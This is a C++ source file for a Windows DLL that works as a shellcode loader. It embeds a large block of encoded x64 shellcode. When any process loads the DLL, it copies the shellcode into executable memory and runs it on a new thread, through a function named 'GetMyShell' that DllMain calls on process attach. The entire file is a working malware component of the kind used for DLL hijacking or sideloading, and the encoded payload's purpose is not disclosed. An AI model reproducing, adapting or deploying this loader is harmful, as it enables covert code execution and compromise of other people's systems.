// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include<Windows.h>


extern __declspec(dllexport) int GetMyShell(void);

int  GetMyShell(void)
{
    unsigned char ShellCode[] = { 0x48,0x31,0xc9,0x48,0x81,0xe9,0xb2,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
0xff,0xff,0x48,0xbb,0xc0,0xbb,0xc8,0x1e,0xb2,0x98,0xfa,0xfe,0x48,0x31,0x58,
0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x3c,0xf3,0x4b,0xfa,0x42,0x70,
0x36,0xfe,0xc0,0xbb,0x89,0x4f,0xf3,0xc8,0xa8,0xb6,0xf1,0x69,0x99,0x48,0xd7,
0xd0,0x71,0xac,0xa0,0xf3,0x43,0x4c,0xaa,0xd0,0x71,0xac,0xe0,0xf3,0xc7,0xa9,
0xf8,0xd2,0xb7,0xcf,0x09,0xf3,0x43,0x6c,0xe2,0xd0,0xcb,0x3e,0x6c,0x87,0xa9,
0x62,0xb0,0xb4,0xda,0xbf,0x01,0x72,0xc5,0x5f,0xb3,0x59,0x18,0x13,0x92,0xfa,
0x99,0x56,0x39,0xca,0xda,0x75,0x82,0x87,0x80,0x1f,0x62,0xfe,0x7b,0x86,0xd8,
0xb0,0xca,0x11,0x37,0xea,0xfa,0xfe,0xc0,0x30,0x48,0x96,0xb2,0x98,0xfa,0xb6,
0x45,0x7b,0xbc,0x79,0xfa,0x99,0x2a,0x75,0x88,0xa3,0x8c,0x95,0xf2,0xb8,0xb3,
0xff,0x10,0xeb,0x2b,0x48,0xff,0xa9,0x33,0xb6,0x3f,0x72,0x89,0x95,0x86,0x10,
0xb2,0xff,0x16,0xf3,0xf9,0xde,0xf3,0x59,0x33,0xf3,0x6c,0xfa,0xc9,0xdf,0x8a,
0x78,0x8f,0x0f,0x8c,0xb8,0x84,0x3a,0xba,0xdd,0xc3,0x2f,0xb5,0x63,0x90,0x5a,
0x39,0xd8,0xde,0xb7,0xc1,0x6b,0xae,0x5f,0x39,0x94,0xb2,0xba,0x4b,0xfb,0xd4,
0x57,0xb3,0x48,0xbb,0x75,0xc4,0x33,0x80,0x1f,0x62,0xd9,0xa2,0xbf,0x98,0xe5,
0x91,0x44,0xf3,0xc0,0xbb,0xa7,0x81,0xe1,0x80,0x9d,0x5e,0xb8,0xbb,0xac,0x3f,
0x5b,0x90,0x5f,0xeb,0xc2,0xb2,0x75,0xd2,0x52,0x83,0xe1,0x4d,0x67,0xa7,0xb6,
0xf1,0x60,0x9b,0x57,0x0c,0xef,0x93,0x90,0xa9,0xd5,0xad,0x6a,0xb2,0xd9,0xac,
0xb6,0x49,0x5a,0x81,0xd9,0x70,0xd4,0x8d,0xd8,0xc7,0x44,0x1d,0x4d,0xe1,0xd0,
0x73,0x1f,0x93,0xe1,0x85,0x2f,0x72,0xd5,0xcb,0x37,0x93,0xe8,0x81,0xa4,0x88,
0xce,0x83,0x59,0xc0,0xbb,0xc8,0x1e,0x4d,0x4d,0x12,0xf3,0xc0,0xbb,0xc8,0x2f,
0x8b,0xaa,0xd4,0xcf,0xf6,0x83,0xe6,0x2f,0x9c,0xaf,0xc8,0xfe,0x9a,0xf3,0x41,
0xdf,0xfb,0x5f,0x3a,0x45,0xc1,0xbb,0xc8,0x53,0x83,0x51,0xa9,0xad,0xaa,0xb8,
0x9b,0x57,0x08,0xcf,0x73,0x61,0x06,0xbb,0xc8,0x1e,0xb2,0x67,0x2f,0x16,0xa9,
0xbb,0xc8,0x1e,0x9d,0xfc,0xbc,0xbc,0xba,0x8d,0x9f,0x2b,0xf5,0xfc,0xcf,0xa1,
0x97,0xcf,0xbc,0x7b,0x82,0xec,0xce,0x8e,0xf6,0x8b,0xbf,0x79,0xd0,0xc2,0xb8,
0x8b,0x88,0xf4,0xae,0x6f,0xf7,0xd2,0xbd,0xc9,0x8a,0xdc,0x81,0x6e,0xdd,0xcf,
0x8e,0xb1,0x92,0xf2,0x8e,0x5f,0xc6,0xf3,0x92,0xb4,0x91,0xe2,0x84,0x6e,0xf1,
0xe1,0xcc,0xcc,0xf1,0xe2,0xbb,0x7a,0xc5,0xd1,0x89,0x9a,0x9a,0xef,0x91,0x68,
0x80,0xe0,0xc2,0xbb,0xa5,0xca,0xa4,0x6c,0xdd,0xea,0x96,0xc9,0x8a,0xd7,0xf8,
0x29,0xc5,0xdb,0xbe,0x94,0xba,0x82,0xbf,0x54,0xca,0xdf,0x97,0xaf,0x9f,0xf0,
0x8b,0x6e,0xb2,0xd0,0x73,0x3f,0x93,0xe1,0x89,0x46,0xff,0xa9,0x33,0xad,0x88,
0x03,0xc8,0x1c,0x9a,0x1c,0xfa,0xfe,0xc0,0xbb,0x98,0x4d,0xe1,0xd1,0x3d,0x3c,
0x2b,0xee,0xe6,0x25,0x4d,0x4d,0xb2,0x77,0x06,0xd1,0xc2,0x41,0xe1,0xc2,0xb2,
0x77,0x31,0xf6,0xf9,0xd7,0xff,0xa9,0x33,0xad,0x93,0xf2,0x0f,0xdc,0x9f,0x9e,
0xe2,0x85,0x3f,0x6e,0x4d,0xde,0xc7,0x87,0xb2,0x39,0x01,0x33,0xdb,0x1e,0xb2,
0xd1,0x40,0xba,0x30,0x8e,0x28,0x1e,0xb2,0x98,0xfa,0x01,0x15,0xf3,0x37,0xd1,
0xc6,0x9a,0x11,0x32,0x28,0xee,0xc8,0x1e,0xb2,0xcb,0xa3,0x94,0x80,0xe1,0x81,
0x97,0x63,0x59,0x18,0xee,0x89,0x7c,0x08,0x1e,0xa2,0x98,0xfa,0xb7,0x7a,0xe3,
0x6c,0x4d,0x57,0x98,0xfa,0xfe,0xc0,0x44,0x1d,0x56,0x21,0xcb,0xa9,0xb6,0x49,
0x5c,0x80,0x97,0x43,0xd0,0x73,0x24,0x89,0x7c,0x08,0x1e,0x92,0x98,0xfa,0xb7,
0x49,0x42,0x81,0xa4,0xa0,0x0e,0x73,0x1c,0xc0,0xbb,0xc8,0x1e,0x4d,0x4d,0xb2,
0x7d,0x04,0x9b,0x4d,0xde,0xc6,0x2a,0x9c,0x75,0xc7,0xf3,0xc9,0xdd,0x37,0x58,
0x8f,0x2c,0x98,0x78,0x90,0x74,0xb2,0xc1,0xb3,0x39,0x02,0x4b,0x7d,0xbc,0xe4,
0x67,0x2f,0xfe };
    
    SIZE_T ShellLength = sizeof(ShellCode);
    void* Shell_Base_Addr;
    HANDLE Thread_Handle;
    Shell_Base_Addr = VirtualAlloc(0, ShellLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(Shell_Base_Addr, ShellCode, ShellLength);
    Thread_Handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Shell_Base_Addr, 0, 0, 0);
    WaitForSingleObject(Thread_Handle, 0);
    return 0;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
         GetMyShell();
         break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

